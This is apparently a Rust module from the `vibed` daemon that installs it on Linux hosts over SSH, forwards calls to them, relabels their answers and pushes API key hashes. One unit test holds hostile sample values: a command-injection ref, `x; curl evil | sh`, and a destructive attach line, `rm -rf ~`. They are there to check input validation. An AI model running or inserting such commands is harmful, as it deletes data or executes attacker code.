//! Linux hosts, as the Mac's `vibed` sees them (PRD: Linux hosts and
//! external access). It installs `vibed` on one over SSH, keeps a link to
//! it, and from then on a call that names the host goes to the host's own
//! `vibed` over that link, and its answer comes back under the host's
//! name. The host's events join this one's stream, its agents join the
//! menu and MCP, and the API keys made here are pushed to it, so one key
//! works everywhere. Transcripts stay on the host.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use serde_json::{Value, json};
use vibe_core::model::{
    AgentState, EventKind, HostLink, LOCAL_HOST, TunnelState, validate_host_name, validate_ref,
    validate_ssh_destination,
};
use vibe_core::rpc::{
    Agent, AgentList, AgentsList, ApiKey, ErrorCode, ErrorObject, HostAddParams,
    HostExternalParams, HostInfo, HostInstall, HostList, HostNameParams, HostsExternal, KeyList,
    KeySyncParams, KeysList, KeysSync, Method, NoParams,
};
use vibe_core::time::parse_rfc3339;

use crate::core::{Core, error, invalid, lock, store_error};

/// How long a connected host has to say when keys were last used there.
const KEYS_ASK: Duration = Duration::from_secs(3);
use std::sync::atomic::Ordering;

use crate::link::{Link, tried_upgrade};
use crate::remote::{Installed, Remote, TOOLS};

/// The methods that act on one host, by its `host` param, and so go to a
/// Linux host's `vibed` when they name one.
pub const FORWARDED: &[&str] = &[
    "projects.list",
    "projects.add",
    "projects.remove",
    "profiles.list",
    "profiles.create",
    "profiles.update",
    "profiles.delete",
    "limits.get",
    "limits.set",
    "mcp.get",
    "mcp.set",
    "sessions.list",
    "sessions.attach",
    "agents.start",
    "agents.list",
    "agents.delete",
    "agents.interrupt",
    "agents.send",
    "agents.check",
    "agents.output",
    "agents.messages",
];

/// How long a forwarded call may take. Starting an agent fetches, cuts a
/// worktree and runs `.vibe/setup.sh`, and adding a project may clone a
/// big repo: those get as long as they need here, within reason. A send
/// may wake an agent first.
pub(crate) fn call_timeout(method: &str) -> Duration {
    match method {
        "agents.start" | "projects.add" | "agents.delete" => Duration::from_secs(60 * 60),
        "agents.send" | "sessions.attach" => Duration::from_secs(5 * 60),
        _ => Duration::from_secs(2 * 60),
    }
}

/// Rewrites what a host said about itself as this host says it: its
/// `local` becomes its name, and an agent's attach line is the one that
/// reaches it from here, over SSH.
fn relabel(value: &mut Value, link: &Link, remote: &dyn Remote) {
    match value {
        Value::Object(map) => {
            // Whatever it calls itself, it's this host's `link.name`: a host
            // can't put rows under another's name.
            if map.contains_key("host") {
                map.insert("host".into(), json!(link.name));
            }
            if map.contains_key("attach")
                && let Some(agent) = map.get("ref").and_then(Value::as_str)
            {
                let line = remote.attach_line(&link.address, agent);
                map.insert("attach".into(), json!(line));
            }
            for v in map.values_mut() {
                relabel(v, link, remote);
            }
        }
        Value::Array(items) => {
            // An agent whose ref no vibed would make is left out: its ref
            // goes into lines this Mac runs.
            items.retain(|v| match (v.get("attach"), v.get("ref")) {
                (Some(_), Some(r)) => r.as_str().is_some_and(|r| validate_ref(r).is_ok()),
                _ => true,
            });
            items.iter_mut().for_each(|v| relabel(v, link, remote));
        }
        _ => {}
    }
}

/// An error a host answered with, under its name.
fn relabel_error(mut e: ErrorObject, link: &Link) -> ErrorObject {
    e.message = e
        .message
        .replace(&format!(" on {LOCAL_HOST}"), &format!(" on {}", link.name));
    e
}

impl Core {
    /// The links, one per Linux host, from the registry.
    pub(crate) fn load_links(&self) -> Result<(), ErrorObject> {
        let hosts = self.store().hosts().map_err(store_error)?;
        let mut links = lock(&self.links);
        for h in hosts {
            if let Some(address) = &h.address {
                links
                    .entry(h.name.clone())
                    .or_insert_with(|| Arc::new(Link::new(&h.name, address)));
            }
        }
        Ok(())
    }

    /// The link to the Linux host `name`, if it's one.
    pub fn link(&self, name: &str) -> Option<Arc<Link>> {
        lock(&self.links).get(name).cloned()
    }

    /// The link a call's params name, if they name a Linux host.
    pub(crate) fn link_for(&self, params: Option<&Value>) -> Option<Arc<Link>> {
        let host = params?.get("host")?.as_str()?;
        if host == LOCAL_HOST {
            return None;
        }
        self.link(host)
    }

    // hosts.list

    pub fn hosts(&self) -> Result<HostList, ErrorObject> {
        let mut hosts = self.store().hosts().map_err(store_error)?;
        let serving = self.mcp_serving.load(std::sync::atomic::Ordering::SeqCst);
        for h in hosts.iter_mut() {
            if h.link == HostLink::Local {
                h.mcp = serving;
                h.version = Some(self.info().version.clone());
                h.missing = self.missing_tools();
                h.memory = self.memory_use();
                self.describe_public(h);
            } else if let Some(link) = self.link(&h.name) {
                *h = link.describe(h.clone());
                h.memory = link.reported().and_then(|own| own.memory);
                self.describe_external(h, &link);
            }
        }
        Ok(HostList { hosts })
    }

    /// Fills in how a Linux host this Mac made the external address is
    /// doing: the tunnel to it, and what's wrong, if anything is. What the
    /// host says first (port 443, Let's Encrypt), as that's what to fix;
    /// then the tunnel's trouble.
    fn describe_external(&self, h: &mut HostInfo, link: &Link) {
        if !h.external {
            return;
        }
        let view = self.tunnel_view(&h.name);
        h.tunnel = Some(view.as_ref().map_or(TunnelState::Down, |v| v.state));
        let reported = link.reported();
        let theirs = reported.as_ref().and_then(|o| o.external_detail.clone());
        let pending = (link.connected() && link.reported_domain().is_none())
            .then(|| format!("{} hasn't started serving it yet", h.name));
        let down = (!link.connected())
            .then(|| format!("{}'s link is down: it serves it once it's back", h.name));
        h.external_detail = theirs
            .or(pending)
            .or_else(|| view.and_then(|v| v.detail))
            .or(down);
    }

    /// What this host lacks of the tools its agents need, if it's a Linux
    /// host; on a Mac the setup's doctor checks them (#14).
    fn missing_tools(&self) -> Vec<String> {
        if self.info().os != "linux" {
            return Vec::new();
        }
        let path = std::env::var_os("PATH");
        let home = self.layout.home();
        TOOLS
            .iter()
            .filter(|t| crate::core::find_tool(t, path.as_deref(), Some(home)).is_none())
            .map(|t| (*t).to_owned())
            .collect()
    }

    pub(crate) fn host_info(&self, name: &str) -> Result<HostInfo, ErrorObject> {
        self.hosts()?
            .hosts
            .into_iter()
            .find(|h| h.name == name)
            .ok_or_else(|| error(ErrorCode::NotFound, format!("no host named {name}")))
    }

    // hosts.add, hosts.upgrade, hosts.remove

    /// Add Linux host…: installs `vibed` over SSH, records the host, and
    /// starts its link.
    pub async fn add_host(&self, p: HostAddParams) -> Result<HostInstall, ErrorObject> {
        validate_host_name(&p.name).map_err(invalid)?;
        validate_ssh_destination(&p.address).map_err(invalid)?;
        let taken = || {
            error(
                ErrorCode::Conflict,
                format!("a host named {} already exists", p.name),
            )
        };
        if self.store().has_host(&p.name).map_err(store_error)? {
            return Err(taken());
        }
        if !lock(&self.adding_hosts).insert(p.name.clone()) {
            return Err(error(
                ErrorCode::Conflict,
                format!("{} is being added already", p.name),
            ));
        }
        let result = self.install_new_host(&p).await;
        lock(&self.adding_hosts).remove(&p.name);
        result
    }

    async fn install_new_host(&self, p: &HostAddParams) -> Result<HostInstall, ErrorObject> {
        crate::log!(
            "vibed: adding {} at {}: installing vibed over SSH",
            p.name,
            p.address
        );
        let installed = self.install_on(&p.name, &p.address).await?;
        let info = HostInfo {
            name: p.name.clone(),
            os: installed.os.clone(),
            label: installed.label.clone(),
            link: HostLink::Down,
            external: false,
            mcp: false,
            address: Some(p.address.clone()),
            version: Some(installed.version.clone()),
            missing: installed.missing.clone(),
            detail: None,
            url: None,
            tunnel: None,
            external_detail: None,
            memory: None,
        };
        self.store()
            .add_host(&info, self.now())
            .map_err(store_error)?;
        let link = Arc::new(Link::new(&p.name, &p.address));
        lock(&self.links).insert(p.name.clone(), Arc::clone(&link));
        self.start_link(&link);
        crate::log!(
            "vibed: added {} ({}, vibed {}{})",
            p.name,
            installed.label,
            installed.version,
            if installed.missing.is_empty() {
                String::new()
            } else {
                format!("; missing {}", installed.missing.join(", "))
            }
        );
        let mut e = self.event(EventKind::HostAdded);
        e.host = p.name.clone();
        self.publish(e);
        Ok(HostInstall {
            host: link.describe(info),
            changed: installed.changed,
            notes: installed.notes,
        })
    }

    async fn install_on(&self, name: &str, address: &str) -> Result<Installed, ErrorObject> {
        self.remote.install(address).await.map_err(|e| {
            crate::log!("vibed: installing vibed on {name} failed: {e}");
            error(ErrorCode::CommandFailed, e)
        })
    }

    /// Installs this build's `vibed` on a host added already, and checks
    /// its tools again.
    pub async fn upgrade_host(&self, p: HostNameParams) -> Result<HostInstall, ErrorObject> {
        let link = self.linux_host(&p.host)?;
        let installed = self.install_on(&link.name, &link.address).await?;
        self.record_install(&link, &installed)?;
        Ok(HostInstall {
            host: self.host_info(&link.name)?,
            changed: installed.changed,
            notes: installed.notes,
        })
    }

    fn record_install(&self, link: &Arc<Link>, installed: &Installed) -> Result<(), ErrorObject> {
        let mut info = self.store().host(&link.name).map_err(store_error)?;
        info.os = installed.os.clone();
        info.label = installed.label.clone();
        info.version = Some(installed.version.clone());
        info.missing = installed.missing.clone();
        self.store().set_host_report(&info).map_err(store_error)?;
        crate::log!(
            "vibed: {} runs vibed {}{}",
            link.name,
            installed.version,
            if installed.changed {
                ", just installed"
            } else {
                " already"
            }
        );
        self.host_link_changed(link);
        // A restarted vibed there dropped the link; take it up again now.
        link.kick();
        Ok(())
    }

    /// Forgets a Linux host. It runs on there, on its own.
    pub async fn remove_host(&self, p: HostNameParams) -> Result<HostInfo, ErrorObject> {
        let link = self.linux_host(&p.host)?;
        let info = self.host_info(&p.host)?;
        // Forgotten while its link is down, it would serve the external
        // address on, with every key it has, and never hear otherwise.
        if info.external && !link.connected() {
            return Err(error(
                ErrorCode::Conflict,
                format!(
                    "{} is the external address and its link is down: remove it once it's back, \
                     so it stops serving publicly",
                    p.host
                ),
            ));
        }
        // The keys this Mac pushed there stop working there: once it's
        // forgotten, a revoke here would never reach it.
        if link.connected()
            && let Err(e) = self
                .forward_typed::<KeysSync>(&link, &KeySyncParams { keys: Vec::new() })
                .await
        {
            crate::log!(
                "vibed: can't take this Mac's keys off {}: {}; revoke them there with vibe key",
                link.name,
                e.message
            );
        }
        // Nor is it the external address any more: it stops serving it.
        if info.external
            && link.connected()
            && let Err(e) = self
                .forward_typed::<HostsExternal>(
                    &link,
                    &HostExternalParams {
                        host: None,
                        on: false,
                        domain: None,
                    },
                )
                .await
        {
            crate::log!(
                "vibed: can't stop {} serving the external address: {}",
                link.name,
                e.message
            );
        }
        self.store().remove_host(&p.host).map_err(store_error)?;
        lock(&self.links).remove(&p.host);
        link.stop();
        self.sync_tunnel();
        crate::log!(
            "vibed: removed {}; its vibed and agents run on there, on their own",
            p.host
        );
        let mut e = self.event(EventKind::HostRemoved);
        e.host = p.host.clone();
        self.publish(e);
        Ok(info)
    }

    pub(crate) fn linux_host(&self, name: &str) -> Result<Arc<Link>, ErrorObject> {
        if name == LOCAL_HOST {
            return Err(invalid(format!(
                "{LOCAL_HOST} is this host; name a Linux host added to it"
            )));
        }
        self.link(name)
            .ok_or_else(|| error(ErrorCode::NotFound, format!("no host named {name}")))
    }

    // Forwarding.

    /// Calls `method` on `link`'s host with `params`, less their `host`,
    /// and gives its answer as this host says it.
    pub async fn forward(
        &self,
        link: &Link,
        method: &str,
        mut params: Value,
    ) -> Result<Value, ErrorObject> {
        if let Some(map) = params.as_object_mut() {
            map.remove("host");
        }
        let mut value = link
            .call(self, method, params, call_timeout(method))
            .await
            .map_err(|e| relabel_error(e, link))?;
        relabel(&mut value, link, &*self.remote);
        Ok(value)
    }

    /// [`Core::forward`], typed.
    pub async fn forward_typed<M: Method>(
        &self,
        link: &Link,
        params: &M::Params,
    ) -> Result<M::Result, ErrorObject> {
        let params = serde_json::to_value(params)
            .map_err(|e| error(ErrorCode::InternalError, format!("Internal error: {e}")))?;
        let value = self.forward(link, M::NAME, params).await?;
        serde_json::from_value(value).map_err(|e| {
            error(
                ErrorCode::InternalError,
                format!(
                    "Internal error: {} answered {} with something unexpected: {e}",
                    link.name,
                    M::NAME
                ),
            )
        })
    }

    /// A Linux host's agents: as it lists them now while its link is up,
    /// or as it last listed them while it's down.
    pub async fn remote_agents(&self, link: &Link) -> Vec<Agent> {
        if link.connected() {
            match self
                .forward_typed::<AgentsList>(link, &Default::default())
                .await
            {
                Ok(list) => {
                    self.keep_agents(link, &list.agents);
                    return list.agents;
                }
                Err(e) => crate::log!("vibed: can't list {}'s agents: {}", link.name, e.message),
            }
        }
        self.kept_agents(link)
    }

    fn kept_agents(&self, link: &Link) -> Vec<Agent> {
        let kept = self.store().host_agents(&link.name).unwrap_or_default();
        serde_json::from_str::<Vec<Agent>>(&kept).unwrap_or_default()
    }

    fn keep_agents(&self, link: &Link, agents: &[Agent]) {
        let json = serde_json::to_string(agents).expect("agents serialize");
        if let Err(e) = self.store().set_host_agents(&link.name, &json) {
            crate::log!("vibed: can't keep {}'s agents: {e}", link.name);
        }
    }

    /// Changes one kept agent of `link`'s host, as an event says.
    fn change_kept_agent(&self, link: &Link, agent: &str, change: impl FnOnce(&mut Agent)) {
        let mut agents = self.kept_agents(link);
        if let Some(a) = agents.iter_mut().find(|a| a.agent == agent) {
            change(a);
            self.keep_agents(link, &agents);
        }
    }

    /// Reads `link`'s host's agents again, in the background.
    /// Reads `link`'s host's agents again, in the background: one read at
    /// a time, and one more after it for any asked for meanwhile, however
    /// many events asked.
    fn refresh_agents(&self, link: &Arc<Link>) {
        if link.refresh_wanted.swap(true, Ordering::SeqCst) {
            return;
        }
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            while link.refresh_wanted.swap(false, Ordering::SeqCst) {
                core.remote_agents(&link).await;
            }
        });
    }

    // What links tell the core.

    /// What a host said of itself as its link came up: its OS, hostname,
    /// version and missing tools.
    pub(crate) fn host_reported(
        &self,
        link: &Link,
        own: Option<&HostInfo>,
        version: Option<String>,
    ) {
        let Ok(mut info) = self.store().host(&link.name) else {
            return;
        };
        let before = info.clone();
        if let Some(own) = own {
            info.os = own.os.clone();
            info.label = own.label.clone();
            info.missing = own.missing.clone();
        }
        if version.is_some() {
            info.version = version;
        }
        if info != before
            && let Err(e) = self.store().set_host_report(&info)
        {
            crate::log!("vibed: can't record what {} said: {e}", link.name);
        }
    }

    /// Publishes a `host.link` event: `link`'s state or report changed.
    pub(crate) fn host_link_changed(&self, link: &Link) {
        let mut e = self.event(EventKind::HostLink);
        e.host = link.name.clone();
        let info = link.describe(HostInfo {
            name: link.name.clone(),
            os: String::new(),
            label: String::new(),
            link: HostLink::Down,
            external: false,
            mcp: false,
            address: None,
            version: None,
            missing: Vec::new(),
            detail: None,
            url: None,
            tunnel: None,
            external_detail: None,
            memory: None,
        });
        e.state = Some(info.link.to_string());
        e.message = info.detail;
        self.publish(e);
    }

    /// What follows a link coming up: the host's agents read again, this
    /// host's keys pushed to it, and an upgrade if it runs another `vibed`.
    pub(crate) fn link_came_up(&self, link: &Arc<Link>) {
        self.refresh_agents(link);
        self.push_keys_to(link);
        self.reconcile_external(link);
        let theirs = self.store().host(&link.name).ok().and_then(|h| h.version);
        // Only up: a newer vibed's registry is one an older one can't read.
        if theirs.is_some_and(|v| older(&v, &self.info().version)) {
            self.upgrade_in_background(link);
        }
    }

    /// Installs this build on `link`'s host, once per run, as when it runs
    /// another version or speaks another protocol.
    pub(crate) fn upgrade_in_background(&self, link: &Arc<Link>) {
        if tried_upgrade(link) {
            return;
        }
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            crate::log!(
                "vibed: {} runs another vibed than this one ({}); upgrading it",
                link.name,
                core.info().version
            );
            match core.remote.install(&link.address).await {
                Ok(installed) => {
                    if let Err(e) = core.record_install(&link, &installed) {
                        crate::log!("vibed: can't record {}'s upgrade: {}", link.name, e.message);
                    }
                }
                Err(e) => crate::log!("vibed: can't upgrade {}: {e}", link.name),
            }
        });
    }

    /// An event from `link`'s host, onto this host's stream under its name.
    pub(crate) fn remote_event(&self, link: &Arc<Link>, params: Value) {
        let Some(event) = crate::link::relabel_event(&link.name, params) else {
            return;
        };
        match event.kind {
            // A host's own hosts aren't this one's.
            EventKind::HostAdded | EventKind::HostRemoved | EventKind::HostLink => return,
            EventKind::AgentState => {
                if let (Some(agent), Some(state)) = (&event.agent, &event.state)
                    && let Ok(state) = state.parse::<AgentState>()
                {
                    self.change_kept_agent(link, agent, |a| a.state = state);
                }
            }
            EventKind::AgentStatus => {
                if let (Some(agent), Some(status)) = (&event.agent, &event.status) {
                    let status = status.clone();
                    self.change_kept_agent(link, agent, |a| a.status = status);
                }
            }
            EventKind::AgentAdded | EventKind::AgentDeleted | EventKind::Lagged => {
                self.refresh_agents(link);
            }
            _ => {}
        }
        self.publish(event);
    }

    // API keys.

    /// Pushes this host's keys, by their hashes, to every Linux host whose
    /// link is up, as after a key is made or revoked.
    pub(crate) fn push_keys(&self) {
        let links: Vec<Arc<Link>> = lock(&self.links).values().cloned().collect();
        for link in links.iter().filter(|l| l.connected()) {
            self.push_keys_to(link);
        }
    }

    pub(crate) fn push_keys_to(&self, link: &Arc<Link>) {
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            let keys = match core.store().key_hashes() {
                Ok(keys) => keys,
                Err(e) => {
                    crate::log!("vibed: can't read the keys to push: {e}");
                    link.keys_stale.store(true, Ordering::SeqCst);
                    return;
                }
            };
            let n = keys.len();
            match core
                .forward_typed::<KeysSync>(&link, &KeySyncParams { keys })
                .await
            {
                Ok(there) => {
                    core.note_key_uses(&link.name, &there.keys);
                    link.keys_stale.store(false, Ordering::SeqCst);
                    crate::log!(
                        "vibed: pushed {n} API key{} to {}",
                        if n == 1 { "" } else { "s" },
                        link.name
                    );
                }
                Err(e) => {
                    // The next ping tries again.
                    link.keys_stale.store(true, Ordering::SeqCst);
                    crate::log!(
                        "vibed: can't push the API keys to {}: {}",
                        link.name,
                        e.message
                    );
                }
            }
        });
    }

    /// `keys.list`: every key, with when it was last used anywhere. A key
    /// made here and pushed to Linux hosts is used there too, where the
    /// host records it; each connected host is asked, and what it saw is
    /// kept here, so the time stands while the host is away.
    pub async fn keys_everywhere(&self) -> Result<KeyList, ErrorObject> {
        let links: Vec<Arc<Link>> = lock(&self.links)
            .values()
            .filter(|l| l.connected())
            .cloned()
            .collect();
        // Connected hosts answer at once; one that doesn't is let go.
        for link in links {
            let there = tokio::time::timeout(
                KEYS_ASK,
                self.forward_typed::<KeysList>(&link, &NoParams {}),
            )
            .await;
            match there {
                Ok(Ok(there)) => self.note_key_uses(&link.name, &there.keys),
                Ok(Err(e)) => crate::log!(
                    "vibed: can't ask {} when keys were last used: {}",
                    link.name,
                    e.message
                ),
                Err(_) => crate::log!(
                    "vibed: {} didn't say when keys were last used in {}s",
                    link.name,
                    KEYS_ASK.as_secs()
                ),
            }
        }
        self.keys()
    }

    /// Keeps the uses a host recorded of the keys pushed to it.
    pub(crate) fn note_key_uses(&self, host: &str, there: &[ApiKey]) {
        let mut store = self.store();
        for k in there.iter().filter(|k| k.pushed) {
            let Some(at) = k.last_used_at.as_deref().and_then(parse_rfc3339) else {
                continue;
            };
            match store.note_key_used(&k.name, &k.prefix, at) {
                Ok(true) => crate::log!("vibed: API key {} was used on {host}", k.name),
                Ok(false) => {}
                Err(e) => crate::log!("vibed: can't record {}'s use on {host}: {e}", k.name),
            }
        }
    }

    /// `keys.sync`: the keys a Mac pushed here, by their hashes, in place of
    /// those it pushed before.
    pub fn sync_keys(&self, p: KeySyncParams) -> Result<KeyList, ErrorObject> {
        let mut seen = HashMap::new();
        for k in &p.keys {
            vibe_core::model::validate_key_name(&k.name).map_err(invalid)?;
            let hex =
                k.hash.len() == 64 && k.hash.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f'));
            if !hex {
                return Err(invalid(format!(
                    "{}'s hash isn't SHA-256 in lowercase hex",
                    k.name
                )));
            }
            if seen.insert(k.hash.as_str(), ()).is_some() {
                return Err(invalid(format!("{} is pushed twice", k.name)));
            }
        }
        self.store()
            .sync_pushed_keys(&p.keys)
            .map_err(store_error)?;
        // What keys saw of the Mac's agents goes with them.
        self.peer.forget_all();
        crate::log!(
            "vibed: {} API key{} pushed here",
            p.keys.len(),
            if p.keys.len() == 1 { " is" } else { "s are" }
        );
        self.publish(self.event(EventKind::KeysChanged));
        self.keys()
    }

    /// `agents.list` for a Linux host, as dispatch gives it.
    pub(crate) async fn remote_agent_list(&self, link: &Link) -> AgentList {
        AgentList {
            agents: self.remote_agents(link).await,
        }
    }
}

/// Whether version `a` is older than `b`, by their dotted numbers: `0.1.9` is
/// older than `0.1.10`. One that isn't numbers is never older.
pub fn older(a: &str, b: &str) -> bool {
    let parse = |v: &str| {
        v.split(['.', '-', '+'])
            .take(3)
            .map(|p| p.parse::<u64>().ok())
            .collect::<Option<Vec<_>>>()
    };
    match (parse(a), parse(b)) {
        (Some(a), Some(b)) => a < b,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::remote::Ssh;

    fn ssh() -> Ssh {
        Ssh {
            program: "ssh".into(),
            bundle: None,
            shared: None,
        }
    }

    #[test]
    fn a_hosts_answers_come_under_its_name() {
        let link = Link::new("vps", "me@vps");
        let mut v = json!({"agents": [
            {"host": "local", "ref": "quiet-amber-otter", "attach": "vibe attach quiet-amber-otter",
             "status": {"activity": "done"}},
            // A host can't put rows under another's name, nor smuggle a
            // command into the line the Mac runs to attach.
            {"host": "mac", "ref": "x; curl evil | sh", "attach": "anything"},
            {"host": "elsewhere", "ref": "calm-silver-heron", "attach": "rm -rf ~"},
        ]});
        relabel(&mut v, &link, &ssh());
        assert_eq!(
            v,
            json!({"agents": [
                {"host": "vps", "ref": "quiet-amber-otter",
                 "attach": "ssh -t me@vps .local/lib/vibeos/vibe attach quiet-amber-otter",
                 "status": {"activity": "done"}},
                {"host": "vps", "ref": "calm-silver-heron",
                 "attach": "ssh -t me@vps .local/lib/vibeos/vibe attach calm-silver-heron"},
            ]})
        );
        let e = relabel_error(
            ErrorObject::new(ErrorCode::NotFound, "no project named web on local"),
            &link,
        );
        assert_eq!(e.message, "no project named web on vps");
    }

    #[test]
    fn versions_compare_by_their_numbers() {
        assert!(older("0.1.0", "0.2.0"));
        assert!(older("0.1.9", "0.1.10"));
        assert!(!older("0.2.0", "0.1.0"));
        assert!(!older("0.1.0", "0.1.0"));
        assert!(!older("weird", "0.1.0"));
    }
}
